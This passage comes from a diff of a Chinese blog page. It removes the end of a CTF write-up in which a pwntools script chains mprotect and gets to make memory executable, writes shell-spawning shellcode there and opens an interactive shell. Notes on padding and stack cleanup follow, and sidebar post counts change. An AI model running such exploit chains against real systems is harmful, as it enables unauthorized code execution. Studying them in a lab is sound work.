p32(0x1000) + p32(7)</span><br><span class="line">payload += p32(gets) + p32(addr) + p32(addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>一些小问题：</p>
-<p>①观察 main() 的汇编可以看到并没有 <code>push ebp</code> 的操作，而是直接用 <code>sub </code> 和 <code>add</code> 来开拓和平衡栈空间，所以padding只需要0x2D即可。</p>
-<img src="/2021/12/01/%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/main-1.jpg" class>
-
-<p>②因为有 mprotect() 的缘故，我们可以随便找一块内存来写入我们的shellcode并跳转到此处执行，只要保证我们的程序在运行过程中不会因我们破坏的这块内存空间导致错误即可。</p>
-<p>③payload中的 pop3_ret 是用来清栈从而保证payload的执行的，如下图，简单理解即可</p>
-<img src="/2021/12/01/%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/stack.jpg" class>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1192,14 +1183,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">61</span>
+          <span class="site-state-item-count">65</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">40</span>
+        <span class="site-state-item-count">43</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
